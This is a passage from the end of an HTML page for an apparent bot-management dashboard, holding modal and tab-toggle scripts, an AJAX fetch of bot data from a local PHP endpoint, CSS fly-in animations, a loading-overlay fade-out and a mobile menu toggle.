                    modal.style.display = "none";
                }

                // Function to fetch bot data using AJAX
                function fetchBotData(botId) {
                    return new Promise(function(resolve, reject) {
                        // Make an AJAX request to fetch the data based on botId
                        var xhr = new XMLHttpRequest();
                        xhr.open("GET", "fetch_bot_data.php?botId=" + botId, true);
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState === 4) {
                                if (xhr.status === 200) {
                                    // Parse the JSON response
                                    var data = JSON.parse(xhr.responseText);
                                    resolve(data);
                                } else {
                                    reject("Error fetching data");
                                }
                            }
                        };
                        xhr.send();
                    });
                }
            </script>

            <script>
                function info() {
                    document.getElementById('info').style.display = '';
                    document.getElementById('actions').style.display = 'none';
                }

                function actions() {
                    document.getElementById('info').style.display = 'none';
                    document.getElementById('actions').style.display = '';
                }
            </script>


            <style>
                .modal {
                    display: none;
                    position: fixed;
                    z-index: 1;
                    margin-top: -6rem;
                    border: var(--background);
                    left: 0;
                    top: 00;
                    width: 100%;
                    height: 100%;
                    overflow: auto;
                    background-color: rgba(0, 0, 0, 0.0);
                }

                .modal-content {
                    top: 0;
                    margin: 10% auto;
                    width: 80%;
                    max-width: 600px;
                    /* Add these lines */
                    margin: 5% auto;
                    width: 95%;
                    max-height: 90vh;
                    overflow-y: auto;
                }

                .close {
                    color: #aaaaaa;
                    float: right;
                    font-size: 28px;
                    font-weight: bold;
                    cursor: pointer;
                }

                #modalContent {
                    /* Add your styles for the info content here */
                }
            </style>

















        </div>
    </div> <!-- end -->

    <style>
        @keyframes topFlyIn {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Define the left-flying animation keyframes */
        @keyframes leftFlyIn {
            from {
                transform: translateX(-100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the right-flying animation keyframes */
        @keyframes rightFlyIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the bottom-flying animation keyframes */
        @keyframes bottomFlyIn {
            from {
                transform: translateY(100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Apply the animation to elements with the respective class */
        .top-flying {
            animation-name: topFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(-100%);
        }

        .left-flying {
            animation-name: leftFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(-100%);
        }

        .right-flying {
            animation-name: rightFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(100%);
        }

        .bottom-flying {
            animation-name: bottomFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(200%);
        }
    </style>

    <style>
        input::placeholder {
            color: #a8a29e;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Wait for fonts and stylesheets
            Promise.all([
                document.fonts.ready,
                new Promise(resolve => {
                    // Check if all stylesheets are loaded
                    const styleSheets = Array.from(document.styleSheets);
                    if (styleSheets.every(sheet => sheet.loaded !== false)) {
                        resolve();
                    } else {
                        window.addEventListener('load', resolve);
                    }
                })
            ]).then(() => {
                const overlay = document.querySelector('.loading-overlay');

                // Add the fade-out class
                overlay.classList.add('fade-out');

                // Remove the element after the transition completes
                overlay.addEventListener('transitionend', function() {
                    overlay.parentNode.removeChild(overlay);
                }, {
                    once: true
                });
            });
        });

        // Preload custom fonts if you're using any
        const fonts = ['Kanit'];
        fonts.forEach(font => {
            new FontFace(font, `url(path/to/${font}.woff2)`)
                .load()
                .then(loadedFont => document.fonts.add(loadedFont));
        });
    </script>

    <script>
        // Mobile menu toggle
        document.addEventListener('DOMContentLoaded', function() {
            const mobileMenuButton = document.querySelector('#mobile\\ topNav button');
            const desktopSidenav = document.querySelector('.col-span-2.bg.xl\\:grid');

            mobileMenuButton.addEventListener('click', function() {
                if (desktopSidenav.classList.contains('sm:hidden')) {
                    desktopSidenav.classList.remove('sm:hidden');
                    desktopSidenav.classList.add('sm:block');
                } else {
                    desktopSidenav.classList.add('sm:hidden');
                    desktopSidenav.classList.remove('sm:block');
                }
            });
        });
    </script>
</body>

</html>